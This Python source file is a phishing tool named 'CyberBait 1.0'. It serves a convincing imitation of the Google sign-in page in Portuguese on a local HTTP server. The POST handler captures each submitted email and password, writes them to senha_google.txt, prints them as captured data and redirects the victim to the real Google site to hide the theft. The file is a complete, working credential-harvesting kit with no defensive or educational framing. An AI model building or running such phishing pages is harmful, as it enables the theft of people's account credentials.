
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import sys
import time
from flask import Flask, render_template, request
from urllib.parse import parse_qs

VERMELHO = "\033[31m"
VERDE = "\033[92m"
AMARELO = "\033[33m"
ROJO = "\033[91m"
RESET = "\033[0m"

PAGINAS = {}
porta = int(input("Escolha a porta do servidor: "))


def load():
    progress_chars = [
        "[" + "#" * i + " " * (20 - i) + "]"
        for i in range(21)
    ]

    for i, progress in enumerate(progress_chars):
        porcento = int((i + 1) / len(progress_chars) * 100)
        sys.stdout.write(
            "\r" + VERMELHO + progress + f" {porcento}%"
        )
        sys.stdout.flush()
        time.sleep(0.1)

    print(RESET)


class Servidor(BaseHTTPRequestHandler):

    def do_GET(self):
        html = PAGINAS.get(self.path)

        if html is None:
            self.send_error(404, "Página não encontrada")
            return

        self.send_response(200)
        self.send_header(
            "Content-Type",
            "text/html; charset=utf-8"
        )
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        # Captura os dados enviados pelo formulário
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        email = params.get('email', [''])
        senha = params.get('senha', [''])

        # Salva em arquivo local
        with open("senha_google.txt", "a") as f:
            f.write(f"Email: {email} | Senha: {senha}\n")

        print(VERDE + f"\n[!] Dados capturados: {email}: {senha}" + RESET)

        self.send_response(302)
        self.send_header('Location', 'https://accounts.google.com/')
        self.end_headers()


class MeuServidor(HTTPServer):
    allow_reuse_address = True


def iniciar_servidor():
    global porta

    try:
        servidor = MeuServidor(("0.0.0.0", porta), Servidor)

    except OSError:
        print(AMARELO + "Porta ocupada! Procurando outra..." + RESET)
        servidor = MeuServidor(("0.0.0.0", 0), Servidor)
        porta = servidor.server_address[1]

    threading.Thread(
        target=servidor.serve_forever,
        daemon=True
    ).start()

    print(VERDE + f"Servidor iniciado na porta {porta}" + RESET)


def google():
    HTML_GOOGLE = """
    <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Fazer login – Contas do Google</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            :root { --azul: #1a73e8; --azul-escuro: #1765cc; --texto: #202124; --cinza: #5f6368; --borda: #dadce0; --erro: #d93025; }
            body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 24px; padding: 24px 16px; background: #fff; color: var(--texto); font-family: "Google Sans", Roboto, Arial, sans-serif; }
            .card { width: 100%; max-width: 450px; min-height: 400px; padding: 48px 40px 36px; border: 1px solid var(--borda); border-radius: 8px; }
            .logo { text-align: center; font-size: 24px; font-weight: 500; letter-spacing: -.5px; margin-bottom: 16px; }
            .logo .b { color: #4285f4; } .logo .r { color: #ea4335; } .logo .y { color: #fbbc05; } .logo .g { color: #34a853; }
            h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
            .sub { text-align: center; font-size: 16px; margin-bottom: 32px; }
            .etapa[hidden] { display: none; }
            .campo { position: relative; margin-bottom: 4px; }
            .campo input { width: 100%; height: 56px; padding: 13px 15px; font: 400 16px Roboto, Arial, sans-serif; color: var(--texto); border: 1px solid #747775; border-radius: 4px; outline: none; background: transparent; }
            .campo label { position: absolute; left: 12px; top: 18px; padding: 0 4px; font: 400 16px Roboto, Arial, sans-serif; color: var(--cinza); background: #fff; pointer-events: none; transition: all .15s ease; }
            .campo input:focus { border: 2px solid var(--azul); padding: 12px 14px; }
            .campo input:focus + label, .campo input:not(:placeholder-shown) + label { top: -8px; font-size: 12px; }
            .campo input:focus + label { color: var(--azul); }
            .campo.erro input { border: 2px solid var(--erro); padding: 12px 14px; }
            .campo.erro input + label { color: var(--erro); }
            .msg-erro { display: none; margin-top: 6px; font-size: 12px; color: var(--erro); }
            .campo.erro + .msg-erro { display: block; }
            .link { display: inline-block; margin-top: 8px; font: 500 14px Roboto, Arial, sans-serif; color: var(--azul); text-decoration: none; background: none; border: none; cursor: pointer; }
            .aviso { margin-top: 40px; font-size: 14px; line-height: 1.5; color: var(--cinza); }
            .aviso a { color: var(--azul); font-weight: 500; text-decoration: none; }
            .acoes { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
            .btn { min-width: 88px; height: 36px; padding: 0 24px; font: 500 14px Roboto, Arial, sans-serif; border: none; border-radius: 18px; cursor: pointer; transition: background .15s; }
            .btn-primario { color: #fff; background: var(--azul); }
            .btn-texto { color: var(--azul); background: none; padding: 0 8px; }
            .chip { display: flex; align-items: center; gap: 8px; width: max-content; margin: 0 auto 28px; padding: 4px 12px 4px 4px; font: 500 14px Roboto, Arial, sans-serif; color: var(--texto); background: #fff; border: 1px solid var(--borda); border-radius: 16px; cursor: pointer; }
            .chip .avatar { width: 24px; height: 24px; display: grid; place-items: center; font-size: 12px; color: #fff; background: #7b1fa2; border-radius: 50%; }
            .mostrar { display: flex; align-items: center; gap: 12px; margin-top: 16px; font-size: 14px; cursor: pointer; }
            .rodape { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: var(--cinza); margin-top: 20px; }
            @media (max-width: 600px) { .card { border: none; padding: 24px 24px 16px; } }
        </style>
        </head>
        <body>
        <main class="card">
            <div class="logo"><span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span></div>
            <section class="etapa" id="etapa-email">
                <h1>Fazer login</h1>
                <p class="sub">Ir para o Gmail</p>
                <div class="campo" id="campo-email">
                    <input type="email" id="email" placeholder=" " autocomplete="username" autofocus>
                    <label for="email">E-mail ou telefone</label>
                </div>
                <p class="msg-erro">Informe um e-mail ou número de telefone</p>
                <button type="button" class="link">Esqueceu seu e-mail?</button>
                <p class="aviso">Não está no seu computador? Use o modo visitante. <a href="#">Saiba mais</a></p>
                <div class="acoes">
                    <button type="button" class="btn btn-texto">Criar conta</button>
                    <button type="button" class="btn btn-primario" id="proxima-email">Próxima</button>
                </div>
            </section>
            <section class="etapa" id="etapa-senha" hidden>
                <h1>Olá</h1>
                <button type="button" class="chip" id="voltar">
                    <span class="avatar" id="avatar">U</span>
                    <span class="email" id="email-chip"></span>
                </button>
                <div class="campo" id="campo-senha">
                    <input type="password" id="senha" placeholder=" " autocomplete="current-password">
                    <label for="senha">Digite sua senha</label>
                </div>
                <p class="msg-erro">Informe uma senha</p>
                <label class="mostrar"><input type="checkbox" id="mostrar-senha"> Mostrar senha</label>
                <div class="acoes">
                    <button type="button" class="btn btn-texto">Esqueceu a senha?</button>
                    <button type="button" class="btn btn-primario" id="proxima-senha">Próxima</button>
                </div>
            </section>
        </main>
        <footer class="rodape">
            <select><option>Português (Brasil)</option></select>
            <nav><a href="#">Ajuda</a> <a href="#">Privacidade</a> <a href="#">Termos</a></nav>
        </footer>
        <script>
            const $ = (id) => document.getElementById(id);
            const etapaEmail = $('etapa-email'), etapaSenha = $('etapa-senha'), email = $('email'), senha = $('senha');

            function irParaSenha() {
                if (!email.value.trim()) { $('campo-email').classList.add('erro'); return; }
                $('email-chip').textContent = email.value.trim();
                $('avatar').textContent = email.value.trim().charAt(0).toUpperCase();
                etapaEmail.hidden = true; etapaSenha.hidden = false; senha.focus();
            }

        function enviarDados() {
            if (!senha.value) { $('campo-senha').classList.add('erro'); return; }
            
            // URLSearchParams envia como application/x-www-form-urlencoded
            const params = new URLSearchParams();
            params.append('email', email.value);
            params.append('senha', senha.value);

            fetch('/', { 
                method: 'POST', 
                body: params 
            }).then(() => {
                window.location.href = 'https://accounts.google.com/';
            });
        }

            $('proxima-email').addEventListener('click', irParaSenha);
            $('proxima-senha').addEventListener('click', enviarDados);
            $('voltar').addEventListener('click', () => { etapaSenha.hidden = true; etapaEmail.hidden = false; });
            $('mostrar-senha').addEventListener('change', (e) => { senha.type = e.target.checked ? 'text' : 'password'; });
            email.addEventListener('input', () => $('campo-email').classList.remove('erro'));
            senha.addEventListener('input', () => $('campo-senha').classList.remove('erro'));
        </script>
        </body>
        </html>

    """

    PAGINAS["/google"] = HTML_GOOGLE

    url = f"http://127.0.0.1:{porta}/google"

    print(VERDE + url + RESET)


def instagram():
    print("EM DESENVOLVIMENTO KKKKK")


def sair():
    sys.exit()


function = {
    "Google": google,
    "Instagram": instagram,
    "Sair": sair
}

pastas = [
    "Google",
    "Instagram",
    "Sair"
]


load()
iniciar_servidor()

while True:
    print(AMARELO + "=" * 31)
    print(ROJO + "CyberBait 1.0" + RESET)
    print(ROJO + "FERRAMENTA EM DESENVOLVIMENTO" + RESET)

    for i, pasta in enumerate(pastas):
        print(VERDE + f"[{i}] {pasta}" + RESET)

    try:
        escolha = int(input("Escolha sua opção: "))
        nome = pastas[escolha]
        function[nome]()

    except (ValueError, IndexError):
        print(VERMELHO + "Opção inválida!" + RESET)
